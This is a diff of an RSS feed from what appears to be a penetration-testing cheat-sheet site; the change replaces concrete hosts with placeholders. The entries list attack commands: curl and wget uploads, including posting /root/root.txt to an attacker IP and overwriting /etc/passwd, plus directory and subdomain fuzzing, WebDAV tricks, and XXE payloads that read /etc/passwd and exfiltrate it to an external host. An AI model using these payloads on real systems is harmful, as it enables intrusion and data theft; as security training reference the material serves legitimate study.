@@ -12,21 +12,21 @@
       <link>https://tldrbins.github.io/advance_curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # PUT a file curl -X PUT http://example.com/example.txt -d @example.txt # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@example.com/example.txt -d @example.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://example.com/example.txt --data-binary @example.</description>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;&amp;lt;QUERY_STRING&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # PUT a file curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;DOMAIN&amp;gt;/&amp;lt;FILE&amp;gt; -d @&amp;lt;FILE&amp;gt; # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; --data-binary @&amp;lt;FILE&amp;gt; # POST a file with form param &amp;#39;file&amp;#39; curl -X POST -F &amp;#39;file=@&amp;lt;FILE&amp;gt;p;type=&amp;lt;APPLICATION_TYPE&amp;gt;;filename=&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # POST a file in raw-text format (not as attachment) with form param &amp;#39;file&amp;#39; curl -X POST -F &amp;#39;file=&amp;lt;&amp;lt;FILE&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Not to handle sequences of &amp;#39;/.</description>
     </item>
     <item>
       <title>Advance wget</title>
       <link>https://tldrbins.github.io/advance_wget/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_wget/</guid>
-      <description> Advance wget # Provide a file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd </description>
+      <description>Advance wget # Provide a file with urls wget --input-file &amp;lt;FILE_PATH&amp;gt; # POST a file wget --post-file &amp;lt;FILE_PATH&amp;gt; &amp;lt;TARGET&amp;gt; # Overwrite a file wget &amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; -O &amp;lt;FILE_PATH&amp;gt; </description>
     </item>
     <item>
       <title>Electron</title>
       <link>https://tldrbins.github.io/electron/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/electron/</guid>
-      <description> Tools sudo npm -g install asar Unpack app.asar # List files asar l app.asar # Extract all files asar e app.asar # Extract a file asar ef app.asar main.js </description>
+      <description>Tools sudo npm -g install asar Unpack app.asar # List files asar l &amp;lt;FILE&amp;gt; # Extract all files asar e &amp;lt;FILE&amp;gt; # Extract a file asar ef &amp;lt;FILE&amp;gt; main.js </description>
     </item>
     <item>
       <title>Squid Proxy</title>
@@ -40,28 +40,28 @@
       <link>https://tldrbins.github.io/subdomain_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/subdomain_enum/</guid>
-      <description>Add domain/subdomain to /etc/hosts echo &amp;#34;10.10.11.10 example.com&amp;#34; | sudo tee -a /etc/hosts wfuzz gobuster wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.example.com&amp;#34; -u http://example.com --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.example.com&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://example.com gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.</description>
+      <description>Add domain/subdomain to /etc/hosts echo &amp;#34;&amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt;&amp;#34; | sudo tee -a /etc/hosts wfuzz gobuster wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; -u http://&amp;lt;DOMAIN&amp;gt; Take note of the word size, Ctrl+C to interrupt the process, then run again wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Host: FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; -u http://&amp;lt;DOMAIN&amp;gt; --hw 10 Filter out response with header # For example: Access-Control-Allow-Origin wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H &amp;#34;Origin: http://FUZZ.&amp;lt;DOMAIN&amp;gt;&amp;#34; --filter &amp;#34;r.headers.response ~ &amp;#39;Access-Control-Allow-Origin&amp;#39;&amp;#34; -u http://&amp;lt;DOMAIN&amp;gt; gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.</description>
     </item>
     <item>
       <title>Web Directory Enum</title>
       <link>https://tldrbins.github.io/web_directory_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/web_directory_enum/</guid>
-      <description>feroxbuster wfuzz gobuster bfac ds_walk HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash &amp;lsquo;/&amp;rsquo; to each request feroxbuster -u http://example.com/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt API Fuzzing feroxbuster -u http://example.com/ --force-recursion -C 404,405 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Fuzzing Number Range wfuzz -z range,1-99 http://example.</description>
+      <description>feroxbuster wfuzz gobuster bfac ds_walk HTTP feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links HTTPS feroxbuster -u https://&amp;lt;TARGET&amp;gt;/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --dont-extract-links Specify Extension feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx Add trailing slash &amp;apos;/&amp;apos; to each request feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ -f --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt API Fuzzing feroxbuster -u http://&amp;lt;TARGET&amp;gt;/ --force-recursion -C 404,405 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Fuzzing Number Range wfuzz -z range,1-99 http://&amp;lt;TARGET&amp;gt;/users/FUZZ gobuster dir -u http://&amp;lt;TARGET&amp;gt; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.</description>
     </item>
     <item>
       <title>Webdav</title>
       <link>https://tldrbins.github.io/webdav/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/webdav/</guid>
-      <description> Tools davtest curl # Without creds davtest -url http://example.com # With creds davtest -url http://example.com -auth &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; Ref: Download davtest&#xA;# Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
+      <description>Tools davtest curl # Without creds davtest -url http://&amp;lt;TARGET&amp;gt; # With creds davtest -url http://&amp;lt;TARGET&amp;gt; -auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; Ref: Download davtest&#xA;# Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://&amp;lt;TARGET&amp;gt;/&amp;lt;NEW_FILENAME&amp;gt;&amp;#39; http://&amp;lt;TARGET&amp;gt;/&amp;lt;FILE&amp;gt; </description>
     </item>
     <item>
       <title>XXE (XML External Entity)</title>
       <link>https://tldrbins.github.io/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/xxe/</guid>
-      <description> XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; External DTD (2 stage) &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://10.10.14.10/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://10.10.14.10/evil.dtd&amp;#34;&amp;gt; %bar; %eval; ]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;exfil;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
+      <description>XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; External DTD (2 stage) &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://&amp;lt;LOCAL_IP&amp;gt;/evil.dtd&amp;#34;&amp;gt; %bar; %eval; ]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;exfil;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
     </item>
   </channel>
 </rss>
